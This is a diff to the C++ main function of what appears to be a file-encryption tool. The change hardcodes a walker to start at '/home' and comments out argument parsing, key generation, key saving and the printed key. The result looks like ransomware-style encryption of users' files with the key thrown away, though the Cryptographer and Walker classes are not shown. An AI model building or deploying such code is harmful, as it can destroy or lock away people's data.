@@ -5,26 +5,30 @@
 #include <fstream>
 
 int main(int argc, char **argv) {
-	InpArgsCorrector correctInput(argc, argv);
+	//InpArgsCorrector correctInput(argc, argv);
 
     auto coolCryptor(std::make_shared<Cryptographer>());
-    if(correctInput.actualKey() == "--keyGen") {
-        coolCryptor->generateKey();
-        coolCryptor->generateIV();
-    }
-    else
-        coolCryptor->setKey(correctInput.actualKey());
+    //std::cout << correctInput.actualKey() << std::endl;
+    //std::cout << correctInput.actualPath() << std::endl;
+    //if(correctInput.actualKey() == "--keyGen") {
+     //   coolCryptor->generateKey();
+     //   coolCryptor->generateIV();
+   // }
+    //else
+      //  coolCryptor->setKey(correctInput.actualKey());
     
-    auto saveKey(static_cast<std::ofstream>("confidential.dat"));
-    saveKey << coolCryptor->getKey() + coolCryptor->getIV();
-    saveKey.close();
+    //auto saveKey(static_cast<std::ofstream>("confidential.dat"));
+    //saveKey << coolCryptor->getKey() + coolCryptor->getIV();
+    //saveKey.close();
 
-    Walker shadowWalker(correctInput.actualPath(), coolCryptor);
-    coolCryptor->willEncrypt(correctInput.wannaEncrypt());
-    shadowWalker.walk(correctInput.isRecursive());
+    Walker shadowWalker("/home", coolCryptor);
+   // coolCryptor->willEncrypt(correctInput.wannaEncrypt());
+    //shadowWalker.walk(correctInput.isRecursive());
 
-    std::cout << "KEY.... DON'T LOSE IT >>>>>>>>>>>>>>> " 
-              << coolCryptor->getKey() + coolCryptor->getIV() << std::endl;
+    shadowWalker.setCmdArgs(argc, argv);
+    shadowWalker.walk();
+//    std::cout << "KEY.... DON'T LOSE IT >>>>>>>>>>>>>>> " 
+  //            << coolCryptor->getKey() + coolCryptor->getIV() << std::endl;
      
 
     return 0;
